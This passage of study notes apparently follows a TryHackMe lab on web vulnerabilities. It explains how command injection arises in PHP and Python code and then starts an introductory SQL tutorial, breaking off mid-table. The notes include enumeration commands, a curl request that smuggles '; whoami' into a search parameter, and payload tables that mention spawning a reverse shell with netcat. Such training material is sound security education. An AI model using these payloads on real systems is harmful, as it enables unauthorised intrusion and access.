<p>2. If it is, then the variable&nbsp;<code>$command_string</code>&nbsp;gets what was passed into the input field</p>
<p>3. The program then goes into a try block to execute the function&nbsp;<code>passthru($command_string)</code>.&nbsp; You can read the docs on&nbsp;<code>passthru()</code>&nbsp;on&nbsp;<a href="https://www.php.net/manual/en/function.passthru.php">PHP's website</a>, but in general, it is executing what gets entered into the input then passing the output directly back to the browser.</p>
<p>4. If the try does not succeed, output the error to page.&nbsp; Generally this won't output anything because you can't output stderr but&nbsp;PHP&nbsp;doesn't let you have a try without a catch.</p>
<p><strong>Ways to Detect Active Command Injection</strong></p>
<p>We know that active command injection occurs when you can see the response from the system call.&nbsp; In the above code, the function&nbsp;<code>passthru()</code>&nbsp;is actually what's doing all of the work here.&nbsp; It's passing the response directly to the document so you can see the fruits of your labor right there.&nbsp; Since we know that, we can go over some useful commands to try to enumerate the machine a bit further.&nbsp; The function call here to&nbsp;<code>passthru()</code>&nbsp;may not always be what's happening behind the scenes, but I felt it was the easiest and least complicated way to demonstrate the vulnerability.&nbsp;&nbsp;</p>
<p><strong>Commands to try</strong></p>
<p><strong>Linux</strong></p>
<p>whoami</p>
<p>id</p>
<p>ifconfig/ip addr</p>
<p>uname -a</p>
<p>ps -ef</p>
<p><strong>Windows</strong></p>
<p>whoami</p>
<p>ver</p>
<p>ipconfig</p>
<p>tasklist</p>
<p>netstat -an</p>
<p>&nbsp;</p>
<h4>Discovering command injection</h4>
<p>In this vulnerability exists because applications often use functions in programming languages such as&nbsp;PHP, Python and NodeJS to pass data to and to make system calls on the machines operating system. For example, taking input from a field and searching for an entry into a file. Take this code snippet below as an example:</p>
<p>In this code snippet, the application takes data that a user enters in an input field named&nbsp;$titleto search a directory for a song title.&nbsp;Lets break this down into a few simple steps.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image049.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p><br><br>&nbsp;</p>
<p><strong>1.</strong>&nbsp;The application stores MP3 files in a directory contained on the operating system.</p>
<p><strong>2.</strong>&nbsp;The user inputs the song title they wish to search for. The application stores this input into the&nbsp;$title&nbsp;variable.</p>
<p><strong>3.&nbsp;</strong>The data within this&nbsp;$title&nbsp;variable is passed to the command&nbsp;grep&nbsp;to search a text file named&nbsp;<i>songtitle.txt</i>&nbsp;for the entry of whatever the user wishes to search for.</p>
<p><strong>4.</strong>&nbsp;The output of this search of&nbsp;<i>songtitle.txt</i>&nbsp;will determine whether the application informs the user that the song exists or not.</p>
<p>Now, this sort of information would typically be stored in a database; however, this is just an example of where an application takes input from a user to interact with the applications operating system.</p>
<p>An attacker could abuse this application by injecting their own commands for the application to execute. Rather than using&nbsp;grep&nbsp;to search for an entry in&nbsp;songtitle.txt, they could ask the application to read data from a more sensitive file.</p>
<p>Abusing applications in this way can be possible no matter the programming language the application uses. As long as the application processes and executes it, it can result in command injection. For example, this code snippet below is an application written in Python.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image051.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Note, you are not expected to understand the syntax behind these applications. However, for the sake of reason, I have outlined the steps of how this Python application works as well.</p>
<p>The "flask" package is used to set up a web server</p>
<p>A function that uses the "subprocess" package to execute a command on the device</p>
<p>We use a route in the webserver that will execute whatever is provided. For example, to execute&nbsp;whoami, we'd need to visit http://flaskapp.thm/whoami</p>
<p>&nbsp;</p>
<h4>Exploiting command injection</h4>
<p>You can often determine whether or not command injection may occur by the behaviours of an application, as you will come to see in the practical session of this room.</p>
<p>Applications that use user input to populate system commands with data can often be combined in unintended behaviour.&nbsp;<strong>For example, the shell operators&nbsp;</strong><code><strong>;</strong></code><strong>,&nbsp;</strong><code><strong>&amp;</strong></code><strong>&nbsp;and&nbsp;</strong><code><strong>&amp;&amp;</strong></code><strong>&nbsp;will combine two (or more) system commands and execute them both</strong>. If you are unfamiliar with this concept, it is worth checking out the&nbsp;<a href="https://tryhackme.com/module/linux-fundamentals">Linux fundamentals module</a>&nbsp;to learn more about this.</p>
<p>Command Injection can be detected in mostly one of two ways:</p>
<p>Blind command injection</p>
<p>Verbose command injection</p>
<p>I have defined these two methods in the table below, where the two sections underneath will explain these in greater detail.</p>
<figure class="table" style="width:100.0%;">
  <table style="border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>Method</strong></td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>Description</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Blind</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">This type of injection is where there is no direct output from the application when testing payloads. You will have to investigate the behaviours of the application to determine whether or not your payload was successful.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Verbose</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">This type of injection is where there is direct feedback from the application once you have tested a payload. For example, running the&nbsp;<code>whoami</code>&nbsp;command to see what user the application is running under. The web application will output the username on the page directly.</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>&nbsp;</p>
<p><u>Detecting Blind Command Injection</u></p>
<p>Blind command injection is when command injection occurs; however, there is no output visible, so it is not immediately noticeable. For example, a command is executed, but the web application outputs no message.</p>
<p>For this type of command injection, we will need to use payloads that will cause some time delay. For example, the&nbsp;<code>ping</code>&nbsp;and&nbsp;<code>sleep</code>&nbsp;commands are significant payloads to test with. Using&nbsp;<code>ping</code>&nbsp;as an example, the application will hang for&nbsp;<i>x</i>&nbsp;seconds in relation to how many&nbsp;<i>pings</i>&nbsp;you have specified.</p>
<p>Another method of detecting blind command injection is by forcing some output. This can be done by using redirection operators such as&nbsp;<code>&gt;</code>. If you are unfamiliar with this, I recommend checking out the&nbsp;<a href="https://tryhackme.com/module/linux-fundamentals">Linux fundamentals module</a>. For example, we can tell the web application to execute commands such as&nbsp;<code>whoami</code>&nbsp;and redirect that to a file. We can then use a command such as&nbsp;<code>cat</code>&nbsp;to read this newly created files contents.</p>
<p>Testing command injection this way is often complicated and requires quite a bit of experimentation, significantly as the syntax for commands varies between Linux and Windows.</p>
<p>The&nbsp;<code>curl</code>&nbsp;command is a great way to test for command injection. This is because you are able to use&nbsp;<code>curl</code>&nbsp;to deliver data to and from an application in your payload. Take this code snippet below as an example, a simple curl payload to an application is possible for command injection.</p>
<p><code>curl&nbsp;http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami</code></p>
<p><u>Detecting Verbose Command Injection</u></p>
<p>Detecting command injection this way is arguably the easiest method of the two. Verbose command injection is when the application gives you feedback or output as to what is happening or being executed.</p>
<p>For example, the output of commands such as&nbsp;<code>ping</code>&nbsp;or&nbsp;<code>whoami</code>&nbsp;is directly displayed on the web application.</p>
<p>&nbsp;</p>
<p><u>Useful payloads</u></p>
<p>I have compiled some valuable payloads for both&nbsp;Linux&nbsp;&amp; Windows into the tables below.</p>
<p>&nbsp;</p>
<p><strong><u>Linux</u></strong></p>
<figure class="table" style="width:100.0%;">
  <table style="border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>Payload</strong></td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>Description</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">whoami</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">See what user the application is running under.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">ls</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">ping</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">This command will invoke the application to hang. This will be useful in testing an application for blind command injection.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">sleep</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">This is another useful payload in testing an application for blind command injection, where the machine does not have&nbsp;<code>ping</code>&nbsp;installed.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">nc</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Netcat can be used to spawn a reverse shell onto the vulnerable application. You can use this foothold to navigate around the target machine for other services, files, or potential means of escalating privileges.</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>&nbsp;</p>
<p><strong><u>Windows</u></strong></p>
<figure class="table" style="width:100.0%;">
  <table style="border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>Payload</strong></td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>Description</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">whoami</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">See what user the application is running under.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">dir</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">ping</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">This command will invoke the application to hang. This will be useful in testing an application for blind command injection.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">timeout</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">This command will also invoke the application to hang. It is also useful for testing an application for blind command injection if the&nbsp;<code>ping</code>&nbsp;command is not installed.</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>&nbsp;</p>
<h3>SQL injection</h3>
<p>SQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed. When a web application communicates with a database using input from a user that hasn't been properly validated, there runs the potential of an attacker being able to steal, delete or alter private and customer data and also attack the web applications authentication methods to private or customer areas. This is why as well as SQLi being one of the oldest web application vulnerabilities, it also can be the most damaging.</p>
<p>&nbsp;</p>
<p>What is a database?</p>
<p>A database is a way of electronically storing collections of data in an organised manner. A database is controlled by a DBMS which is an acronym for&nbsp; Database Management System, DBMS's fall into two camps&nbsp;Relational&nbsp;or&nbsp;Non-Relational, the focus of this room will be on Relational databases,&nbsp; some common one's you'll come across are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite. We'll explain the difference between Relational and Non-Relational databases at the end of this task but first, it's important to learn a few terms.<br><br>&nbsp;</p>
<p>Within a DBMS, you can have multiple databases, each containing its own set of related data. For example, you may have a database called "shop". Within this database, you want to store information about products available to&nbsp;purchase,&nbsp;users&nbsp;who have signed up to your online shop, and information about the&nbsp;orders&nbsp;you've received. You'd store this information separately in the database using something called tables, the tables are identified with a unique name for each one. You can see this structure in the diagram below, but you can also see how a business might have other separate databases to store staff information or the accounts team.</p>
<p><br><br>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image053.png"></figure>
<p>What are tables?</p>
<p>A table is made up of columns and rows, a useful way to imagine a table is like a grid with the columns going across the top from left to right containing the name of the cell and the rows going from top to bottom with each one having the actual data.<br><br>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image055.png" alt="Afbeelding met tafel

Automatisch gegenereerde beschrijving"></figure>
<p><br><br>&nbsp;</p>
<p>Columns:</p>
<p>Each column, better referred to as a field has a unique name per table. When creating a column, you also set the type of data it will contain, common ones being integer (numbers), strings (standard text) or dates. Some databases can contain much more complex data, such as geospatial, which contains location information. Setting the data type also ensures that incorrect information isn't stored, such as the string "hello world" being stored in a column meant for dates. If this happens, the database server will usually produce an error message. A column containing an integer can also have an auto-increment feature enabled; this gives each row of data a unique number that grows (increments) with each subsequent row, doing so creates what is called a&nbsp;key&nbsp;field, a key field has to be unique for every row of data which can be used to find that exact row in SQL queries.<br><br>&nbsp;</p>
<p>Rows:</p>
<p>Rows or records are what contains the individual lines of data. When you add data to the table, a new row/record is created, and when you delete data, a row/record is removed.</p>
<p><br><br>&nbsp;</p>
<p><br><br>&nbsp;</p>
<p>Relational Vs Non-Relational Databases:<br>A relational database, stores information in tables and often the tables have shared information between them, they use columns to specify and define the data being stored and rows to actually store the data. The tables will often contain a column that has a unique ID (primary key) which will then be used in other tables to reference it and cause a relationship between the tables, hence the name&nbsp;relational&nbsp;database.<br><br>&nbsp;</p>
<p>Non-relational databases sometimes called NoSQL on the other hand is any sort of database that doesn't use tables, columns and rows to store the data, a specific database layout doesn't need to be constructed so each row of data can contain different information which can give more flexibility over a relational database.&nbsp; Some popular databases of this type are MongoDB,&nbsp;Cassandra and&nbsp;ElasticSearch.</p>
<p>&nbsp;</p>
<p>SQL (Structured Query Language) is a feature-rich language used for querying databases, these SQL queries are better referred to as statements.<br><br>&nbsp;</p>
<p>The simplest of the commands which we'll cover in this task is used to retrieve (select), update, insert and delete data. Although somewhat similar, some databases servers have their own syntax and slight changes to how things work. All of these examples are based on a MySQL database. After learning the lessons, you'll easily be able to search for alternative syntax online for the different servers. It's worth noting that SQL syntax is not case sensitive.<br><br>&nbsp;</p>
<p><strong>SELECT</strong></p>
<p>The first query type we'll learn is the SELECT query used to retrieve data from the database.&nbsp;</p>
<p>&nbsp;</p>
<p><code>select * from users;</code></p>
<p>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>id</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>username</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>password</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">1</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">jon</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">pass123</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">2</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">admin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">p4ssword</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">3</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">martin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">secret123</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>The first-word SELECT tells the database we want to retrieve some data, the * tells the database we want to receive back all columns from the table. For example, the table may contain three columns (id, username and password). "from users" tells the database we want to retrieve the data from the table named users. Finally, the semicolon at the end tells the database that this is the end of the query.&nbsp;&nbsp;</p>
<p>&nbsp;</p>
<p>The next query is similar to the above, but this time, instead of using the * to return all columns in the database table, we are just requesting the username and password field.</p>
<p>&nbsp;</p>
<p><code>select username,password from users;</code></p>
<p>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>username</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>password</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">jon</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">pass123</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">admin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">p4ssword</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">martin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">secret123</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>The following query, like the first, returns all the columns by using the * selector and then the "LIMIT 1" clause forces the database only to return one row of data. Changing the query to "LIMIT 1,1" forces the query to skip the first result, and then "LIMIT 2,1" skips the first two results, and so on. You need to remember the first number tells the database how many results you wish to skip, and the second number tells the database how many rows to return.</p>
<p>&nbsp;</p>
<p><code>select * from users LIMIT 1;</code></p>
<p>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>id</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>username</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>password</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">1</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">jon</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">pass123</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>Lastly, we're going to utilise the where clause; this is how we can finely pick out the exact data we require by returning data that matches our specific clauses:</p>
<p>&nbsp;</p>
<p><code>select * from users where username='admin';</code></p>
<p>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>id</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>username</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>password</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">2</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">admin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">p4ssword</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>This will only return the rows where the username is equal to admin.</p>
<p>&nbsp;</p>
<p><code>select * from users where username !=&nbsp;'admin';</code></p>
<p>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>id</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>username</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>password</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">1</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">jon</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">pass123</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">3</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">martin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">secret123</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>This will only return the rows where the username is&nbsp;<strong>NOT</strong>&nbsp;equal to admin.</p>
<p>&nbsp;</p>
<p><code>select * from users where username='admin' or username='jon';</code></p>
<p>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>id</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>username</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>password</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">1</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">jon</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">pass123</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">2</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">admin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">p4ssword</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>This will only return the rows where the username is either equal to&nbsp;<strong>admin</strong>&nbsp;or j<strong>on</strong>.&nbsp;</p>
<p>&nbsp;</p>
<p><code>select * from users where username='admin' and password='p4ssword';</code></p>
<p>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>id</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>username</strong></td>
